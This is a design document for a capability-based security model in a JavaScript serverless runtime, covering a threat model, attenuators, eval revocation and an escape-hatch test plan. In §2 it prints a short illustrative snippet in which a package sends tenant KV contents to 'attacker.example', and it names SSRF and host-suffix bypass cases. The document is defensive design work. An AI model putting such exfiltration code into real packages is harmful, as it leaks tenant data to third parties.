# Capabilities — effects are received, never ambient

> **Design of record — NOT built.** Tracker **#751**; leaves enumerated
> there. Supersedes the "static capability gate (**P2**)" line in
> [`package-resolution.md`](package-resolution.md) §0, which named a goal
> but not a mechanism. Nothing here changes the per-tenant outbound
> admission built at the frozen fetch primitive (`src/plan/root.zig`
> `outbound_enabled` → `src/js/bindings/http.zig` `outboundRateOk`); that
> layer is correct where it is (§5). Durable residue graduates back into
> this file before the tracker closes.
>
> [`handler-shape.md`](../handler-shape.md) and
> [`effect-algebra.md`](../effect-algebra.md) still document the
> **as-built** ambient surface and keep doing so until this ships; each
> carries a forward pointer here.

## 0. Scope

| In | Out |
|---|---|
| Removing ambient authority from the realm entirely | Per-tenant plan admission (built — `outboundRateOk`) |
| The handler surface that replaces it | Metering / rate shaping (built — the `.outbound` limiter action) |
| Attenuators — narrowing a capability before delegating | A registry review process (people, not mechanism) |
| Freezing shared intrinsics against poisoning | Wrong-answer attacks (§6) |

Three trust domains:

| Domain | Modules | Authority |
|---|---|---|
| Platform | baked `__system/*` | privileged `__rove.*`, `is_system_module`-gated |
| Customer | `index.mjs`, `_triggers/*`, `_middlewares/*`, own relative imports | whatever the runtime hands the entry point |
| Third-party | `/pkg/<pkg_hash>/…` | only what a caller passed it |

**Known limit.** The boundary tracks provenance *as the deployment declares
it*, not trustworthiness. Third-party code a customer copies into `./lib/`
instead of importing as a package is customer code, and receives whatever
the handler passes it — the vendoring tradeoff, chosen by the author.
State it rather than let the boundary imply more than it delivers.

## 1. Threat model

The attacker publishes, or compromises, a package a tenant depends on —
directly, or as an encapsulated dependency of one
(`package-resolution.md`'s per-importer model pins that edge by
`pkg_hash`, so it cannot *drift* in; it can still be malicious from the
start, or be a compromised release the tenant then pins).

Their code runs inside the tenant's activation with whatever the runtime
makes reachable. What they want:

1. **Exfiltration** — read tenant KV, request headers, secrets; send them
   somewhere.
2. **Amplification** — use the tenant's egress as a spam or
   credential-stuffing relay.
3. **Silent corruption** — wrong answers from a security-critical routine
   (a JWT verifier that returns `true`, a nonce that repeats).
4. **Deputisation** — make the *handler's own* effects do the attacker's
   work, without ever holding authority.
5. **Misfiling** — cause the handler's writes to land under the wrong
   erasure identity (§3.4, `shredKey`).

This design addresses 1, 2, 4 and 5. It does **not** address 3 — see §6.

## 2. What an attacker gets today

Every effect namespace is installed on the shared realm's global object
before any customer or package module evaluates:

- `src/js/globals.zig:1024` — `for (STATIC_NAMESPACES) |ns| installNamespace(ctx, global, ns)`,
  the table at `:1121`.
- The `globals/*.js` public shims eval next, defining the documented
  top-level names ([`builtin-libs.md`](builtin-libs.md)).
- `_harden.js` then does `delete globalThis._system` (`globals.zig:1098`)
  — documented there as **hygiene, not a privilege boundary**.

All modules in an activation share one realm. So a package with an empty
`imports` list and an empty `capabilities` array can today write:

```js
export function formatDate(d) {
  http.send("https://attacker.example/x", JSON.stringify(await kv.list("")));
  return d.toISOString();
}
```

and nothing objects. The manifest's `capabilities` field
(`src/files/manifest_json.zig:80`) is parsed and stored but never
consulted — and could not be load-bearing as written, because it describes
*declared intent* while authority is *ambient*.

## 3. The model

### 3.1 The classification rule

> **If it can reach outside the module — tenant data, the network, another
> activation, another tenant, a durable record — it is a capability and
> arrives as a parameter. If it is pure computation or a web-platform
> standard, it stays ambient.**

The rule matters more than the list: it classifies whatever gets added
later without a fresh argument each time.

The split, **enumerated from what the shims actually install** — the
authority is `__rove.caps` in `installStatic`, asserted by identity in
`globals.zig`'s capability-template test:

| Capability — received | Ambient — stays global |
|---|---|
| `after`, `blob`, `http`, `kv` | the ES intrinsics |
| `next`, `platform`, `stream`, `webhook` | `TextEncoder`/`TextDecoder`, `URLSearchParams` |
| `request`, `response` (per-activation) | `atob`/`btoa`, `base64url`, `hex` |
| `tag`, `unmaskedIp`, `shredKey` (§3.4) | `time` — pure ns coercion |
| | `crypto` — pure + seeded, reaches nothing outside |
| | `console` — see §3.5 |

`crypto` stays ambient deliberately: `sha256`/`hmac` are pure, and
`randomUUID`/`getRandomValues` are *non-determinism*, not authority — the
replay story handles them by seeding (`JS_SetRandomSeed`), not by
capability.

**Names that are not on this list because they are not globals.** An
earlier draft of the table named `events`, `schedule`, `email` and
`retry` as capabilities. None of them exist as top-level names:
`schedule` is the private `_system.sched` behind the `@rewind/schedule`
package, and `email`/`retry` are packages too. Packages receive
capabilities like any other package — being first-party buys them no
ambient reach. `session` likewise is not a top-level name; it is
`request.session`, and rides on `request`.

That error is worth recording rather than quietly fixing: a capability
list assembled from documentation drifts from the one the engine
installs, and the drift is invisible because both halves keep working.
Hence the identity assertion in the test — the template must hold **the**
ambient object, not an equivalent one.

### 3.2 The handler surface

One parameter, and **the platform does not name it** — the canonical form
destructures at the signature:

```js
export default async ({ request, response, kv, http }) => {
  const cursor = request.ctx?.cursor;
  …
};
```

Not naming it is load-bearing twice over. It avoids colliding with the
**one-ctx** invariant (`handler-shape.md`: *"threaded context is `ctx` in /
`request.ctx` out everywhere (one-ctx, no exceptions)"*) — that name is
already correct for what it names, across ~30 shim sites, and the new
thing is the one that should move. And it makes the wide grant awkward:
you cannot casually hand a package everything you never bound to a name.

If a handler wants a name for forwarding, that is its own variable to
choose; rove blesses none. In prose, "the activation object."

The same shape carries into a package, which is the entire point —
promotion is a move, not a rewrite:

```js
export function charge({ http }, amount) { … }
```

### 3.3 Grant by passing, attenuate by narrowing

Three rules, in the object-capability tradition (and the one Roc reaches
by construction, its effects arriving from the platform as values):

1. **No ambient authority.** Nothing can name an effect it was not handed.
2. **Grant by passing.** A function argument, not a policy engine.
3. **Attenuate by narrowing.** What you pass down is smaller than what you
   hold — and this is the *normal* case, not a refinement (§4.3).

Non-inheritance falls out of 1 and 2. Note what this does **not** claim:
capabilities are **transferable** — a direct dependency may delegate what
it holds. The guarantee is *no ambient authority*, so every grant has a
chain of custody visible in source starting at the handler; it is not *no
delegation*.

Passing raw authority stays possible, because a package may genuinely need
open egress and the model must be able to express that. It just stops
being the shortest thing to type (§4.3).

### 3.4 The audit — effects hiding on data objects

`request` is documented as a data shape. Three of its members are not:

| Surface | What it does | Why it is a capability |
|---|---|---|
| `request.tag(k,v)` | writes the durable, OTel-exported log record | **shared 4-slot budget** (`log.MAX_TAGS`) that **throws** on over-cap, so a package can exhaust it and make the *handler's* next call fail |
| `request.unmaskedIp()` | returns the raw client IP | the deliberate escalation past `request.ip`'s masking — PII the handler should be able to withhold |
| `request.shredKey(id)` | sets the activation's crypto-shred identity | it **replaces** rather than adds (`src/binding/root.zig`), and late binding is the normal case — so a package can silently re-file the handler's writes under a different erasure identity |

`shredKey` is the worst of the three: the failure is not exfiltration but
an erasure request for one identity destroying, or failing to destroy,
another's data — quiet, durable, and discovered late.

Everything else on those objects is genuine data: `method`/`path`/`host`/
`query`/`headers`/`cookies`/`body`/`ip`/`tenant`/`sagaId`/`activation`/
`done`/`status`/`chunkSeq`/`fetchId`, `request.session` = `{id}`,
`request.rewind` = `{isRoot}`, and `response.{status,headers,cookies}`.

Non-finding worth recording: `headers`/`cookies`/`body` are lazy
**read-taped** accessors, so a package touching them enlarges the recorded
readset. That is tape size and replay surface, not authority — but it
means "packages cannot affect the record" is not quite true even after
this.

### 3.5 `console` — ambient, and on death row

`console` stays **ambient** and is not made a capability, because it is
scheduled for removal and threading a surface through every signature only
to delete it is work spent twice.

The case for removing it: replay is bit-exact, so per-request debugging
does not need printf — and the codebase already takes this position.
`src/log/root.zig` explains that follower-rebuilt records leave `console`
empty because *"customers recover console via tape replay when needed."*
Only three `console.*` calls exist in first-party handler code, and no
test surface asserts on console output (the sim captures it; the authored
world's `expected` shape has no logs field).

It cannot go yet, on two dependencies:

- **#705** — a failed activation currently replays *clean past the point
  production died*, because a replayed `kv.set` cannot fail. Replay does
  not yet cover the case console is most needed for.
- **#601** — replay answers "why did *this* request do that", never "how
  often does X happen". That job belongs to `tag` + OTel export, which has
  no plumbing yet. Note the tag budget is 4 with a fail-loud over-cap;
  revisit that ceiling *as part of* removing console, not after.

When it goes, bind the name to a thrower naming replay and linking the
record. `ReferenceError: console is not defined` teaches nothing; *"console
is not available — this request is replayable at ‹url›"* teaches the whole
model at the moment someone is receptive.

## 4. Mechanism

### 4.1 Not installing is the denial

Because effects are never installed on the global object, package code
naming `http` gets a `ReferenceError` for free. There is no capability
prologue, no generated deny-list, no per-module discrimination at compile,
no drift risk between a deny-list and `STATIC_NAMESPACES`, and nothing for
§4.5 to keep identical across three engines.

This is the design's best property: **it deletes a mechanism rather than
adding one.** An earlier draft denied ambient names only inside `/pkg/`
via an injected module prologue; that machinery exists only if the handler
keeps ambient authority, and it dissolves once nothing is ambient (§10).

What changes instead is the shims: `globals/*.js` assemble the activation
object rather than assigning to `globalThis`, and `installRequest` hands it
to the entry export. The `_system.*` internal ABI and the baked
`__system/*` privileged surface are untouched.

### 4.2 Realm hardening

Two realm-wide steps, baked into the base snapshot at zero per-request
cost, alongside the existing `_harden.js`.

**Freeze the intrinsics — this is the deputisation defence, and capability
isolation does not touch it.** A package needs *no* authority to overwrite
`Array.prototype.map` and observe or alter data flowing through the
**handler's** own effects. Freeze the ES intrinsics and their prototypes
transitively, SES-`lockdown`-style.

*The arena already bounds this to one activation, and this design must not
claim credit for it.* arenajs shadows base JSObjects on write
(`js_object_for_write`), and its design comment names the case verbatim —
*"Pathological JS code (`globalThis.X = …`, `Array.prototype.foo = …`,
`Object.defineProperty(Object, …)`) can target any base JSObject for
mutation."* The request arena resets between activations, so a poisoned
prototype never reaches the next request or another tenant. What remains
is that package module top-level runs at **import**, before the handler
body, so within that one activation the handler does see it.

**Revoke `eval` — for reviewability, not for authority.** With nothing
ambient, compiling a string yields code with the same empty scope, so eval
is no longer an authority escape. It is still an *obfuscation* escape: the
deploy-time source scan and any human review read source, and
`eval`/`new Function` let a package hide behaviour from both. Revoking it
keeps package behaviour statically visible.

Every route that turns a string into code — `eval`, `new Function`, the
async/generator constructors, and the public C `JS_Eval` — funnels through
`JS_EvalInternal`, which begins

```c
/* the indirection is needed to make 'eval' optional */
if (unlikely(!ctx->eval_internal))
    return JS_ThrowTypeError(ctx, "eval is not supported");
```

`ctx->eval_internal` is a per-**context** pointer and `JS_AddIntrinsicEval`
does nothing but set it. So: install it for the snapshot build
(`evalSnippet` needs the C `JS_Eval` for every shim), clear it before
`JS_FreezeRuntime`, and the revocation is page-protected with everything
else. That needs one function in arenajs, which rove forks:

```c
void JS_RemoveIntrinsicEval(JSContext *ctx) { ctx->eval_internal = NULL; }
```

The serving context never needs it back: runtime modules arrive as
bytecode, and the loader's source-compile fallback fires only when
`Ctx.sources` is populated — only by the deploy thread
(`deploy_thread.zig:510`) and the replay engines (`src/replay/`), each of
which builds its own context (`deploy_thread.zig:401`).

Revoking the capability beats deleting names (`eval`, `Function`, the
prototype-reachable constructors): a compile route nobody enumerated fails
identically to one that was.

### 4.3 Attenuators

**Narrowing is the normal case.** `{ http }` is the exception; `{ http:
http.to("api.stripe.com") }` is the idiom, and every doc example should
show the narrowed form so the ecosystem copies it.

| Capability | Attenuators |
|---|---|
| `kv` | `scoped(prefix)`, **`readonly()`** — probably the commonest real grant |
| `http` | `to(host \| host[])` |
| `blob` | `scoped(prefix)`, `readonly()` |
| `tag` | `keys([…])` — an allowlist, which also sub-divides the 4-slot budget |
| `after` | `only("module.method")` — which target it may arm |
| `shredKey`, `unmaskedIp` | none; all-or-nothing, and rarely granted |

The shape is already proven in-tree: `platform.scope(id)` returns a
`{kv:{get,prefix,set,delete}}` bound to one instance — an attenuator on
the admin surface.

**Invariant: narrowing intersects, never replaces.** If an attenuated
object still exposes `to()`, a package handed `http.to("api.stripe.com")`
calls `.to("attacker.example")` and walks out. `to()` on an
already-narrowed capability intersects; the same holds for `scoped()`
composing on a scoped `kv`. A naive builder gets this wrong by default and
silently voids the model, so every builder needs a negative test for it.

**An empty intersection throws at narrowing time**, not at send time — it
is a programming error, and it should fail where it is written rather than
three frames later as a capability that mysteriously refuses everything.

**`to()` takes a host or an array of hosts. No wildcards in v1.**
`*.stripe.com` is a real need eventually; adding it later is additive and
removing it later is breaking, which is the §7 ratchet. When it lands it
must match on DNS labels, never string suffix, or
`stripe.com.attacker.example` passes.

**Host normalization belongs in one place.** `api.stripe.com` vs
`API.Stripe.com` vs the valid FQDN `api.stripe.com.` vs punycode/IDN vs an
explicit `:443` vs `user@api.stripe.com` must not produce a grant mismatch
in either direction. `rove-ssrf`'s `parseUrl`/`checkUrl` is already the URL
authority in the tree; the normalizer goes there, not at the grant site.

**Narrowing never widens.** `http.to("169.254.169.254")` must not become an
SSRF bypass handed out by a well-meaning handler. The attenuator is an
*additional* check: `rove-ssrf`'s `resolveSafe`/`isBlocked` and plan
admission via `outboundRateOk` both still run and both still win.

**Make the wide grant verbose and greppable.** Passing unrestricted
authority should require writing something deliberate — `http.any()` — so
narrow is short, wide is long, audit becomes search, the deploy-time scan
can count them, and Phase 3's manifest can record them. Today the wide
grant is the shortest thing you can type, which is exactly backwards.

**Two classic bypasses are already closed**, which is what makes a host
allowlist a real boundary here rather than advisory. `fetch_engine.zig:738`
runs customer transfers with **redirects OFF** (only the internal blob and
static doors follow them), and the same block pins the connect with
`CURLOPT_RESOLVE` *"so a second DNS answer (rebinding) can't move the
connect."* The host you allowed is the host the socket reaches.

### 4.4 The escape-hatch inventory

The design is only as good as this list being complete; each entry needs a
negative test that fails if the hatch reopens (§8).

| Hatch | Closed by |
|---|---|
| naming `http` / `kv` / … in a package | §4.1 — never installed |
| `globalThis.http` | §4.1 — nothing to find; `delete globalThis.globalThis` as defence in depth |
| `eval` / `new Function` / prototype constructors / any unenumerated compile route | §4.2 — one revoked choke point |
| widening an attenuated capability | §4.3 — intersect, never replace |
| redirect off an allowed host | already closed — redirects OFF for customer transfers |
| DNS rebinding | already closed — `CURLOPT_RESOLVE` pin |
| prototype poisoning | §4.2 intrinsic freeze (arena already bounds it to one activation) |
| naming `_system` / `__rove` | already built — `referencesPrivilegedSurface` (`deploy_thread.zig:753`), applied to packages only (`:392`) |
| a native binding handing a callback something privileged | audit, §8 |

The last row cannot be closed by a rule and needs eyes: every native that
invokes a JS callback must be checked for what it passes in.

### 4.5 Where the checks live — all three engines

`rove-guards` is the single authority for handler-facing checks and
`rove-binding` the single implementation of the JS↔Zig seam, precisely so
the worker, the offline sim/replay driver, and the browser WASM arena
cannot disagree. Attenuation checks (`to()`'s host match, `scoped()`'s
prefix match) are handler-facing checks and belong there — "is this
allowed", never "what now", per that module's stated boundary.

Anything implemented only in the worker passes silently in the sim and
diverges in the arena. Add `scripts/conformance/` cases, not only Zig
tests.

## 5. Relationship to the layers that already exist

Authority is the intersection of three narrowings, each enforced where its
own failure mode lives:

```
effective authority = plan entitlement      native, per-call, metered, unbypassable
                    ∩ declared capability   manifest, static, fleet-queryable
                    ∩ passed attenuation    scope, free, per-library
```

- **Plan entitlement** is built and stays put. `outbound_enabled` is a
  *typed refusal* with no `Retry-After`, never an absent object — which is
  also why a tier without egress must not be expressed by withholding a
  capability: every package author would then write defensive code for a
  billing state, and a library that works on one tier and throws on
  another is a support burden nobody can test for.
- **Declared capability** is the manifest field, meaningful for the first
  time in Phase 3: an upper bound checked at deploy and answerable
  fleet-wide.
- **Passed attenuation** is this document.

## 6. What this does not prevent

- **Wrong answers.** A JWT verifier returning `true`, or a signing routine
  with a predictable nonce, needs zero capabilities — and `jwt`, `oauth`,
  `oidc`, `sessions` are exactly where that bites. No capability model
  addresses this; the mitigation is keeping those first-party.
- **Data the handler chooses to pass.** A package given the request body
  has the request body.
- **Delegation by a trusted direct dependency** (§3.3).
- **Tape growth from taped reads** (§3.4).
- **Resource exhaustion.** Budget and timeout are separate mechanisms.

## 7. Phasing

**Ship every restriction at its most restrictive setting.** Each is
*additive to relax* (unfreeze an intrinsic, restore `eval`, grant a
capability) and *breaking to tighten*. The asymmetry runs one way, so
maximal is the default and relaxations are earned by a real report.

**The legibility rule.** That only works if a refusal is legible. Every
refusal must be **typed, named, and counted** — never a bare engine
`TypeError`. A customer hitting `Cannot assign to read only property 'map'`
or `eval is not supported` concludes the platform is broken and leaves;
they do not file a relaxation request. Each needs catching and re-throwing
with a message naming the restriction and its relaxation path, plus a
metric, so relaxation decisions come from fleet data.

**Two deadlines, and neither is "launch" generically.** The registry
publishes only `@rewind/*` and only to an operator; third-party self-serve
is explicitly post-v1 (`web/registry/index.mjs`, `RESERVED_SCOPE`). So §1
is gated at the registry today, not at the runtime.

| Phase | Real deadline | Why |
|---|---|---|
| 1 — freeze + eval revocation | **first customer handler** | restricts handler code, so it must precede code that could depend on the freedom |
| 2 — received-not-ambient + attenuators | **first customer handler** | it *is* the handler surface |
| 3 — declaration layer | **third-party self-serve publish** | until then no attacker-authored package can be pinned |
| 0 — effect provenance in the tape | none | pure gain, no surface |

**Phase 0 — effect provenance in the tape.** Record the emitting module on
each effect entry (`src/tape/root.zig:411`). The `.module` channel records
resolution and the effect channels record effects; nothing joins them.
Converts this class of attack from invisible to attributable and
fleet-greppable — detection is the lever a hosted platform has that a
language runtime does not.

**Phase 1 — freeze + revoke.** §4.2. Realm-wide, no surface change.

**Phase 2 — the surface.** §3.2, §3.4, §4.1, §4.3. The largest piece and
the one with a hard deadline: every handler, doc example, conformance case
and first-party package moves to received-not-ambient,
`tag`/`unmaskedIp`/`shredKey` move off `request`, and the attenuator
vocabulary ships. Tractable pre-launch and not after.

**Phase 3 — declaration.** Manifest `capabilities` becomes an enforced
upper bound checked at deploy. The registry already carries a `gates.mjs`
pure section doing publish-time capability extraction that *mirrors the
engine's deploy-time gates*, including its own hand-copied `findsIdent` —
extend that mirror under one authority with generated data, or it drifts
and the registry accepts what the engine rejects.

## 8. Test plan

The failure mode to design against is an inert probe: a negative test that
passes both when the fence holds and when the test never reached it.

- **One case per row of §4.4**, as a package that *attempts* the escape and
  must be refused. Each must be shown failing against the pre-change build
  — a hatch test that has never been red proves nothing.
- **Per-attenuator widening tests**: `.to()` on a narrowed `http`,
  `.scoped()` on a scoped `kv`, must intersect and must not widen.
- **Host normalization table**: case, trailing dot, IDN/punycode, explicit
  port, userinfo — matching in both directions.
- **Prototype-poisoning case**: a package mutates `Array.prototype.map`;
  the handler's subsequent behaviour is unchanged.
- **Conformance cases** (`scripts/conformance/`) for everything
  behaviour-visible, so the sim and the WASM arena agree with the worker.
- **A smoke** publishing a hostile package against a real cluster,
  asserting the refusal reaches the customer as a typed error — the seam,
  not the halves.

## 9. Open questions

1. **Compatibility inventory — prerequisite to Phase 1.** In-tree cost is
   zero: `INTRINSIC_EXTENSIONS` is empty (`Date.now`/`Math.random`
   determinism is native per-context state via
   `JS_SetDateNow`/`JS_SetRandomSeed`, not JS property writes), no
   `globals/*.js` shim mutates an intrinsic, and `web/` mutates none. The
   single repo-wide prototype write is `src/replay/js/textcodec_pure.js`
   patching `TextEncoder`/`TextDecoder.prototype` — rove's own globals,
   not ES intrinsics, in the replay engine's own context. **Scoping
   lesson: freeze the ECMAScript intrinsics, not every shared object rove
   installs.** The open half is what handlers will need: diff quickjs-ng's
   supported surface against it, and inventory `new Function` codegen.
   Anything missing ships as a first-party shim — the base snapshot is
   shared across tenants, so per-tenant polyfills can never live there,
   and there is no "let the app polyfill first, then freeze" window
   (imported packages evaluate before the importing handler's body).
2. **Attenuator vocabulary completeness.** The §4.3 table is a first cut.
   If real handlers repeatedly pass four capabilities to one package, that
   is information *about the package* — it is doing too much — not a
   signal to add a blanket-pass helper. The friction is the mechanism.
3. **`to()` grain.** Host-only in v1. Path-prefix grants
   (`api.stripe.com/v1/charges`) are a plausible later need and invite
   traversal/encoding bugs; host is what determines where bytes go.
4. **Does the WASM arena share the base snapshot's hardening**, or build
   its own realm? Determines whether Phase 1 is one change or two.
5. **The arenajs change is a dep bump, not a local patch.**
   `JS_RemoveIntrinsicEval` lands in `anarchodev/arenajs` first and is
   pinned here by hash in the same PR — push-then-pin, no path override.
6. **Tape corpus regeneration.** Replay re-runs *pinned historical code*
   (the `.module` channel records which deployment/path resolved to which
   bytecode hash), so records of ambient-idiom code cannot replay in a
   received-not-ambient engine. Existing records become unreplayable, and
   that is permanent — regenerate any fixtures the conformance corpus
   depends on **before** the cutover, not after. Do **not** make the
   replay engine keep installing ambient globals for old records: the
   conformance corpus exists to fail when two engines disagree, and that
   would bake in a deliberate permanent disagreement.

## 10. Rejected alternatives

- **A module-scope capability prologue denying ambient names inside
  `/pkg/` only.** The earlier draft of this doc. Rejected once ambient
  authority went away entirely: the machinery exists only to protect a
  handler that keeps ambient globals, and not installing is simpler than
  denying (§4.1).
- **A separate `JSContext` per package.** True realm isolation and the
  strongest version of this. Rejected for launch: module instances are not
  shared across contexts, capability objects must cross the boundary, and
  the per-request arena-reset model would need rework. Revisit if §4.4
  proves incomplete — the phased design is deliberately compatible with
  swapping the mechanism underneath.
- **Naming the handler parameter `ctx`.** Collides with the **one-ctx**
  invariant (`handler-shape.md`), which is 51 doc mentions and ~30 shim
  sites of a deliberate 2026-07-06 unification. The established concept
  keeps its name; the new thing goes unnamed (§3.2).
- **A blanket-pass helper for packages needing several capabilities.**
  Optimises typing over deliberation on a security boundary (§9.2).
- **Withholding a capability to express a plan tier.** See §5.
- **A manifest-only capability gate** (the original P2). Checks a
  declaration while authority stays ambient, so it stops an honest package
  and not a hostile one. Retained as the *declaration* layer in Phase 3,
  which is what it is good for.
- **Auditing the dependency graph instead** (the vendoring answer).
  Rejected as the primary mechanism because it scales by making a human
  the bottleneck; retained as a complement for the §6 cases where no
  mechanism helps.
